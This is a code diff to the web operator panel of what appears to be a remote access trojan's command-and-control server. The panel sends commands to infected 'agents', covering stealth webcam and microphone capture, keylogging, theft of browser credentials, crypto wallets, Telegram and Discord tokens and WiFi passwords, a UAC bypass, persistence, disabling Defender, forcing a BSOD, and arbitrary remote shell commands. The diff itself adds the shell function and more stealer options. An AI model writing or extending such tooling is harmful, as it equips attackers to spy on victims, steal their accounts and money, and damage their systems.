@@ -591,25 +591,32 @@
             <div class="cm-group">
                 <div class="cm-title">Surveillance</div>
                 <div class="cm-item" onclick="cmd('screen_start')"><i class="fa-solid fa-desktop"></i> Watch Screen</div>
-                <div class="cm-item" onclick="cmd('webcam')"><i class="fa-solid fa-video"></i> Stealth Webcam</div>
+                <div class="cm-item" onclick="cmd('webcam_start')"><i class="fa-solid fa-video"></i> Stealth Webcam</div>
                 <div class="cm-item" onclick="cmd('audio_start')"><i class="fa-solid fa-microphone"></i> Bug Microphone</div>
-                <div class="cm-item" onclick="cmd('keylogger')"><i class="fa-solid fa-keyboard"></i> Get Keystrokes</div>
+                <div class="cm-item" onclick="cmd('keylog_start')"><i class="fa-solid fa-keyboard"></i> Get Keystrokes</div>
             </div>
             <div class="cm-group">
                 <div class="cm-title">Data Extraction</div>
-                <div class="cm-item" onclick="cmd('steal_browsers')"><i class="fa-brands fa-chrome"></i> Dump Browsers</div>
-                <div class="cm-item" onclick="cmd('steal_crypto')"><i class="fa-brands fa-bitcoin"></i> Find Wallets</div>
-                <div class="cm-item" onclick="cmd('steal_telegram')"><i class="fa-brands fa-telegram"></i> Clone Telegram</div>
+                <div class="cm-item" onclick="cmd('browsers')"><i class="fa-brands fa-chrome"></i> Dump Browsers</div>
+                <div class="cm-item" onclick="cmd('crypto_wallets')"><i class="fa-brands fa-bitcoin"></i> Find Wallets</div>
+                <div class="cm-item" onclick="cmd('telegram')"><i class="fa-brands fa-telegram"></i> Clone Telegram</div>
+                <div class="cm-item" onclick="cmd('discord')"><i class="fa-brands fa-discord"></i> Discord Tokens</div>
+                <div class="cm-item" onclick="cmd('grabber')"><i class="fa-solid fa-magnet"></i> Ultimate Grabber</div>
+                <div class="cm-item" onclick="cmd('wifi')"><i class="fa-solid fa-wifi"></i> WiFi Passwords</div>
             </div>
             <div class="cm-group">
                 <div class="cm-title">System & Execution</div>
-                <div class="cm-item" onclick="cmd('uac')"><i class="fa-solid fa-shield-halved"></i> UAC Fodhelper</div>
-                <div class="cm-item" onclick="cmd('proxy')"><i class="fa-solid fa-server"></i> Reverse Proxy</div>
+                <div class="cm-item" onclick="cmd('info')"><i class="fa-solid fa-circle-info"></i> System Info</div>
+                <div class="cm-item" onclick="cmd('processes')"><i class="fa-solid fa-list"></i> Process List</div>
+                <div class="cm-item" onclick="cmdShell()"><i class="fa-solid fa-terminal"></i> Run Command</div>
+                <div class="cm-item" onclick="cmd('uac_bypass')"><i class="fa-solid fa-shield-halved"></i> UAC Fodhelper</div>
+                <div class="cm-item" onclick="cmd('reverse_proxy')"><i class="fa-solid fa-server"></i> Reverse Proxy</div>
+                <div class="cm-item" onclick="cmd('persist_install')"><i class="fa-solid fa-anchor"></i> Install Persistence</div>
             </div>
             <div class="cm-group">
                 <div class="cm-title" style="color:var(--danger)">Destructive</div>
                 <div class="cm-item danger" onclick="cmd('bsod')"><i class="fa-solid fa-skull"></i> Trigger BSOD</div>
-                <div class="cm-item danger" onclick="cmd('kill_defender')"><i class="fa-solid fa-radiation"></i> Nuke Defender</div>
+                <div class="cm-item danger" onclick="cmd('defender')"><i class="fa-solid fa-radiation"></i> Nuke Defender</div>
                 <div class="cm-item danger" onclick="cmd('uninstall')"><i class="fa-solid fa-trash"></i> Melt & Uninstall</div>
             </div>
         </div>
@@ -655,7 +662,8 @@
 
         function cmd(action) {
             if(!selectedClient) return;
-            logTerminal(`Executing <${action}> on ${selectedClient}...`, 'sys');
+            logTerminal(`Executing <${action}> on ${selectedClient.substring(0,8)}...`, 'sys');
+            ctxMenu.classList.remove('active');
             fetch('/api/panel/command', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json', 'X-Token': token },
@@ -663,9 +671,29 @@
             })
             .then(r => r.json())
             .then(data => {
-                if(data.ok) logTerminal(`Task queued successfully.`, 'succ');
+                if(data.ok) logTerminal(`Task queued: ${action} (id: ${data.task_id})`, 'succ');
                 else logTerminal(`Failed: ${data.error}`, 'err');
-            });
+            })
+            .catch(e => logTerminal(`Network error: ${e}`, 'err'));
+        }
+
+        function cmdShell() {
+            if(!selectedClient) return;
+            const command = prompt('Enter command to execute on target:');
+            if(!command) return;
+            ctxMenu.classList.remove('active');
+            logTerminal(`Shell> ${command} on ${selectedClient.substring(0,8)}...`, 'sys');
+            fetch('/api/panel/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'X-Token': token },
+                body: JSON.stringify({ cid: selectedClient, cmd: { action: 'shell', command: command } })
+            })
+            .then(r => r.json())
+            .then(data => {
+                if(data.ok) logTerminal(`Shell task queued (id: ${data.task_id})`, 'succ');
+                else logTerminal(`Failed: ${data.error}`, 'err');
+            })
+            .catch(e => logTerminal(`Network error: ${e}`, 'err'));
         }
 
         function adminAction(action) {
@@ -817,6 +845,9 @@
                 setTimeout(() => workspace.style.opacity = '1', 50);
                 initSocket();
                 fetchClients(); // Initial fetch
+                // Start auto-refresh
+                if(_refreshInterval) clearInterval(_refreshInterval);
+                _refreshInterval = setInterval(fetchClients, 10000);
             }, 800);
         }
 
@@ -835,17 +866,27 @@
 
         // --- 7. Networking & Socket ---
         function initSocket() {
-            socket = io({ auth: { token: token } });
+            socket = io();
             
             socket.on('connect', () => {
+                // Authenticate and join 'panel' room
+                socket.emit('auth', { token: token });
                 document.getElementById('island-text').innerText = "C2 SECURE UPLINK";
                 logTerminal("Socket connected to Mainframe.", "succ");
+            });
+            
+            socket.on('auth_ok', data => {
+                logTerminal(`Authenticated as ${data.user}. Real-time updates active.`, "succ");
+                document.querySelector('.island-dot').style.background = "var(--accent)";
+            });
+
+            socket.on('auth_fail', () => {
+                logTerminal("WebSocket auth failed! Re-login required.", "err");
             });
             
             socket.on('disconnect', () => {
                 document.getElementById('island-text').innerText = "UPLINK LOST";
                 document.querySelector('.island-dot').style.background = "var(--danger)";
-                document.querySelector('.island-dot').style.boxShadow = "var(--danger)";
                 logTerminal("Socket disconnected.", "err");
             });
 
@@ -853,20 +894,57 @@
                 renderClients(data);
             });
 
-            socket.on('new_log', data => {
-                logTerminal(`[${data.ip}] ${data.msg}`, data.level === 'INFO' ? 'info' : 'warn');
+            socket.on('client_new', data => {
+                logTerminal(`New agent connected: ${data.hostname} (${data.id?.substring(0,8)}) from ${data.ip}`, 'warn');
+                flashIsland(`NEW AGENT: ${data.hostname}`);
+                fetchClients();
             });
-            
-            socket.on('new_alert', data => {
-                flashIsland(`ALERT: ${data.msg}`);
-                logTerminal(`ALERT: ${data.msg}`, 'err');
+
+            socket.on('task_queued', data => {
+                logTerminal(`Task dispatched to ${data.cid?.substring(0,8)}: ${data.task?.action}`, 'info');
+            });
+
+            socket.on('result', data => {
+                const tag = data.type || 'result';
+                const snippet = (data.data || '').substring(0, 500);
+                logTerminal(`[${data.cid?.substring(0,8)}] ${tag}: ${snippet}`, 'succ');
+            });
+
+            socket.on('stream_frame', data => {
+                // TODO: render screen/webcam frames in modal
             });
         }
+
+        // Auto-refresh every 10 seconds
+        let _refreshInterval = null;
 
         function fetchClients() {
             fetch('/api/panel/clients', { headers: { 'X-Token': token }})
             .then(r => r.json())
-            .then(d => { if(d.ok) renderClients(d.clients); });
+            .then(d => {
+                if(d.ok) {
+                    renderClients(d.clients);
+                    // Render server logs into terminal
+                    if(d.logs && d.logs.length > 0) {
+                        const term = document.getElementById('terminal');
+                        // Only render NEW logs (after our last known timestamp)
+                        if(!window._lastLogTime) window._lastLogTime = 0;
+                        d.logs.forEach(log => {
+                            const logTime = log.time || 0;
+                            if(logTime > window._lastLogTime) {
+                                const dt = new Date(logTime * 1000);
+                                const ts = `${dt.getHours().toString().padStart(2,'0')}:${dt.getMinutes().toString().padStart(2,'0')}:${dt.getSeconds().toString().padStart(2,'0')}`;
+                                const lvl = (log.level || 'info').toLowerCase();
+                                const cls = lvl === 'err' || lvl === 'error' ? 'err' : lvl === 'warn' ? 'warn' : 'info';
+                                term.innerHTML += `<div class="log-line"><span class="log-time">[${ts}]</span> <span class="log-${cls}">${log.msg || log.message || ''}</span></div>`;
+                            }
+                        });
+                        window._lastLogTime = Math.max(...d.logs.map(l => l.time || 0));
+                        term.scrollTop = term.scrollHeight;
+                    }
+                }
+            })
+            .catch(() => {});
         }
 
         function renderClients(data) {
@@ -881,25 +959,27 @@
             
             const now = Date.now()/1000;
             entries.forEach(([id, c]) => {
-                const diff = now - c.last_seen;
-                const isOnline = diff < 15;
+                const diff = now - (c.last_seen || 0);
+                const isOnline = c.online === true || c.online === 'True' || diff < 30;
                 const statusClass = isOnline ? 'status-online' : 'status-offline';
                 const statusTxt = isOnline ? 'ONLINE' : 'DEAD';
                 
                 // OS Icon logic
                 let icon = 'fa-windows';
-                if(c.os.toLowerCase().includes('linux')) icon = 'fa-linux';
+                const osStr = (c.os || '').toLowerCase();
+                if(osStr.includes('linux')) icon = 'fa-linux';
+                if(osStr.includes('mac') || osStr.includes('darwin')) icon = 'fa-apple';
                 
                 let integrity = "SECURE";
-                if(c.admin) integrity = "<span style='color:var(--danger)'>ROOTED/SYSTEM</span>";
+                if(c.is_admin) integrity = "<span style='color:var(--danger)'>ROOTED/SYSTEM</span>";
 
                 const tr = document.createElement('tr');
                 tr.dataset.id = id;
                 tr.innerHTML = `
                     <td style="font-family:var(--font-mono); font-size: 0.8rem; color:var(--text-muted)">${id.substring(0,8)}</td>
-                    <td><b>${c.user}</b> @ ${c.hostname}</td>
-                    <td style="font-family:var(--font-mono)">${c.ip}</td>
-                    <td><i class="fa-brands ${icon} os-icon"></i> ${c.os}</td>
+                    <td><b>${c.username || c.user || '?'}</b> @ ${c.hostname || '?'}</td>
+                    <td style="font-family:var(--font-mono)">${c.ip || '?'}</td>
+                    <td><i class="fa-brands ${icon} os-icon"></i> ${c.os || '?'}</td>
                     <td>${integrity}</td>
                     <td><div class="status-badge ${statusClass}"><div style="width:6px;height:6px;border-radius:50%;background:currentColor"></div>${statusTxt}</div></td>
                 `;
